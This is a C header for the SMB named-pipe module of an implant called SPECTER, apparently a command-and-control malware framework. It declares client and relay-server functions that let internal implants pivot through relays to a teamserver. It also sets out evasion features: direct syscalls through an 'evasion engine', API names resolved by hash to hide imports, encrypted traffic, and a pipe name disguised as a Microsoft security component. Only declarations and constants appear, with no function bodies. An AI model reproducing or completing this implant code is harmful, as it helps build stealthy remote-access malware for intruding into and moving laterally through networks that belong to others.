/**
 * SPECTER Implant — SMB Named Pipe Communications Channel Interface
 *
 * Named pipe client/server for internal pivoting.  HTTPS implants act
 * as relays; internal implants connect via named pipes and relay
 * forwards traffic to the teamserver.  All pipe I/O through evasion
 * engine syscalls (NtCreateFile, NtReadFile, NtWriteFile).
 * Messages use the same ChaCha20-Poly1305 length-prefixed format as HTTPS.
 */

#ifndef COMMS_SMB_H
#define COMMS_SMB_H

#include "specter.h"
#include "comms.h"
#include "config.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

/* Named pipe path limits */
#define SMB_MAX_PIPE_NAME       256     /* Max pipe path length          */
#define SMB_MAX_PIPE_PREFIX     64      /* \\.\pipe\ prefix              */

/* Pipe I/O buffer sizes */
#define SMB_SEND_BUF_SIZE       4096    /* Outbound message buffer       */
#define SMB_RECV_BUF_SIZE       8192    /* Inbound message buffer        */
#define SMB_MSG_HEADER_SIZE     4       /* 4-byte LE length prefix       */

/* Pipe configuration defaults */
#define SMB_MAX_INSTANCES       4       /* Max concurrent server pipes   */
#define SMB_READ_TIMEOUT_MS     5000    /* Read timeout (5 seconds)      */
#define SMB_CONNECT_TIMEOUT_MS  10000   /* Connect timeout (10 seconds)  */
#define SMB_PIPE_BUFFER_SIZE    4096    /* Kernel pipe buffer size       */

/* Pipe open modes and flags (NT constants) */
#define FILE_PIPE_BYTE_STREAM_TYPE    0x00000000
#define FILE_PIPE_MESSAGE_TYPE        0x00000001
#define FILE_PIPE_BYTE_STREAM_MODE    0x00000000
#define FILE_PIPE_MESSAGE_MODE        0x00000001
#define FILE_PIPE_QUEUE_OPERATION     0x00000000
#define FILE_PIPE_COMPLETE_OPERATION  0x00000001
#define FILE_PIPE_INBOUND             0x00000000
#define FILE_PIPE_OUTBOUND            0x00000001
#define FILE_PIPE_FULL_DUPLEX         0x00000002

/* NT file access flags needed for pipes */
#define FILE_WRITE_DATA             0x0002
#define FILE_READ_EA                0x0008
#define FILE_WRITE_EA               0x0010
#define FILE_WRITE_ATTRIBUTES       0x0100
#define FILE_CREATE                 0x00000002
#define FILE_OPEN_IF                0x00000003

/* Additional NT constants for named pipe operations */
#define FILE_NON_DIRECTORY_FILE     0x00000040

/* NtFsControlFile control codes for named pipes */
#define FSCTL_PIPE_LISTEN           0x00110008
#define FSCTL_PIPE_DISCONNECT       0x00110004
#define FSCTL_PIPE_WAIT             0x00110018

/* SMB channel modes */
#define SMB_MODE_CLIENT             0   /* Connect to existing pipe      */
#define SMB_MODE_SERVER             1   /* Create and listen on pipe     */

/* DJB2 hashes for Nt pipe functions */
#define HASH_NTREADFILE             0x39EA4E27  /* "NtReadFile"              */
#define HASH_NTWRITEFILE            0x2E475AB7  /* "NtWriteFile"             */
#define HASH_NTCREATENAMEDPIPEFILE  0xBF0D4289  /* "NtCreateNamedPipeFile"   */
#define HASH_NTFSCONTROLFILE        0xCBD6E982  /* "NtFsControlFile"         */

/* ------------------------------------------------------------------ */
/*  SMB peer connection tracking                                       */
/* ------------------------------------------------------------------ */

typedef struct _SMB_PEER {
    HANDLE  pipe_handle;                /* Pipe handle for this peer     */
    DWORD   peer_id;                    /* Unique peer identifier        */
    BOOL    active;                     /* Peer is connected             */
    BYTE    session_key[32];            /* Per-peer session key          */
    DWORD   msg_seq;                    /* Message sequence number       */
} SMB_PEER;

/* ------------------------------------------------------------------ */
/*  SMB_CONTEXT — SMB channel state                                    */
/* ------------------------------------------------------------------ */

typedef struct _SMB_CONTEXT {
    HANDLE         pipe_handle;         /* Primary pipe handle (client)  */
    WCHAR          pipe_name[SMB_MAX_PIPE_NAME]; /* Full NT pipe path    */
    char           pipe_name_ansi[SMB_MAX_PIPE_NAME]; /* ANSI pipe name  */

    /* Server mode state */
    DWORD          mode;                /* SMB_MODE_CLIENT or _SERVER    */
    SMB_PEER       peers[SMB_MAX_INSTANCES]; /* Connected peers (server) */
    DWORD          peer_count;          /* Number of active peers        */
    HANDLE         server_handles[SMB_MAX_INSTANCES]; /* Server pipe handles */
    DWORD          server_handle_count; /* Active server pipe count      */

    /* Buffers */
    BYTE           send_buf[SMB_SEND_BUF_SIZE];
    BYTE           recv_buf[SMB_RECV_BUF_SIZE];

    /* Connection state */
    COMMS_STATE    state;

    /* Session key (shared with main comms for encryption) */
    BYTE           session_key[32];
    DWORD          msg_seq;             /* Message sequence number       */
} SMB_CONTEXT;

/* ------------------------------------------------------------------ */
/*  Length-prefixed message helpers                                     */
/* ------------------------------------------------------------------ */

/**
 * Build a length-prefixed encrypted message.
 * Format: [4-byte LE length][12-byte nonce][ciphertext][16-byte tag]
 * Returns total wire bytes written to output, or 0 on error.
 */
DWORD smb_build_message(SMB_CONTEXT *ctx, const BYTE *plaintext,
                        DWORD plaintext_len, BYTE *output, DWORD output_len);

/**
 * Parse a length-prefixed encrypted message.
 * Reads length prefix, verifies, decrypts, writes plaintext to output.
 * Returns plaintext length, or 0 on error/auth failure.
 */
DWORD smb_parse_message(SMB_CONTEXT *ctx, const BYTE *wire_data,
                        DWORD wire_len, BYTE *output, DWORD output_len);

/* ------------------------------------------------------------------ */
/*  Pipe name helpers                                                  */
/* ------------------------------------------------------------------ */

/**
 * Build the full NT pipe path from config pipe name.
 * Converts "MSSE-1234-server" → L"\\Device\\NamedPipe\\MSSE-1234-server"
 * for NtCreateFile, or "\\\\.\\pipe\\MSSE-1234-server" for display.
 */
void smb_build_pipe_path(SMB_CONTEXT *ctx, const char *pipe_name);

/* ------------------------------------------------------------------ */
/*  Channel interface — Client mode                                    */
/* ------------------------------------------------------------------ */

/**
 * Connect to a named pipe as a client.
 * Opens the pipe via NtCreateFile through evasion_syscall.
 */
NTSTATUS smb_connect(IMPLANT_CONTEXT *ctx);

/**
 * Send data over the named pipe (length-prefixed, encrypted).
 */
NTSTATUS smb_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);

/**
 * Receive data from the named pipe.
 * data_out: output buffer, data_len: in=buffer size, out=bytes received.
 */
NTSTATUS smb_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len);

/**
 * Disconnect from the named pipe.
 */
NTSTATUS smb_disconnect(IMPLANT_CONTEXT *ctx);

/**
 * Health check: write a 1-byte ping, expect 1-byte pong.
 */
NTSTATUS smb_health_check(IMPLANT_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Server mode — Relay implants                                       */
/* ------------------------------------------------------------------ */

/**
 * Create a named pipe server instance via NtCreateNamedPipeFile.
 * Binds to the profile-specified pipe name.
 */
NTSTATUS smb_listen(IMPLANT_CONTEXT *ctx);

/**
 * Accept an incoming pipe connection (blocking via FSCTL_PIPE_LISTEN).
 * Returns the peer index in peer_idx_out, or error if max peers reached.
 */
NTSTATUS smb_accept(IMPLANT_CONTEXT *ctx, DWORD *peer_idx_out);

/**
 * Send data to a specific connected peer (server mode).
 */
NTSTATUS smb_send_to_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx,
                           const BYTE *data, DWORD len);

/**
 * Receive data from a specific peer (server mode).
 * data_len: in=buffer size, out=bytes received.
 */
NTSTATUS smb_recv_from_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx,
                             BYTE *data_out, DWORD *data_len);

/**
 * Disconnect a specific peer (server mode).
 */
NTSTATUS smb_disconnect_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
SMB_CONTEXT *smb_get_context(void);
void smb_test_reset_context(SMB_CONTEXT *ctx);
#endif

#endif /* COMMS_SMB_H */
